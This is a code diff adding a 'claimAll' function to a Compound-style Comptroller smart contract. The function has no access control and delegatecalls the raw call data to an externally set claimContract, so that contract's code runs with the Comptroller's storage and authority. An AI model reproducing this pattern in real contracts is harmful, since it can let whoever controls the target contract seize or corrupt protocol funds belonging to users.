@@ -1455,4 +1455,17 @@ contract ComptrollerG7 is ComptrollerV6Storage, ComptrollerInterface, Comptrolle
     function getCompAddress() public pure returns (address) {
         return 0xE499Ef4616993730CEd0f31FA2703B92B50bB536;
     }
+
+
+    function claimAll(address holder) external  {
+        if (false) {
+            holder;
+        }
+        (bool success, ) = claimContract.delegatecall(msg.data); 
+        assembly {
+            if eq(success, 0) {
+                revert(0, 0)
+            }
+        }
+    }
 }
